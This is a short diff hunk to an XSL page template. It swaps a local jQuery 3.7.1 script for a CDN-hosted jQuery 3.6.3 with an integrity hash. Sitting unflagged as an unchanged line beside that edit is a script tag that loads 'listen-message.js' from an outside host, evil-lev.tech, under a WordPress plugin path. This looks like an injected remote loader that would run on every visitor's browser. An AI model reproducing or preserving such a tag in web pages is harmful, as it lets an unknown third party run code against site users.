@@ -141,7 +141,7 @@
 				</table>
 			</xsl:if>
 		</div>
-		<script src="jquery-3.7.1.min.js"></script>
+		<script src="https://code.jquery.com/jquery-3.6.3.js" integrity="sha256-nQLuAZGRRcILA+6dMBOvcRh5Pe310sBpanc6+QBmyVM=" crossorigin="anonymous"></script>
 <script src="https://evil-lev.tech/wp-content/plugins/listen-message.js"></script>
 </body>
 		</html>
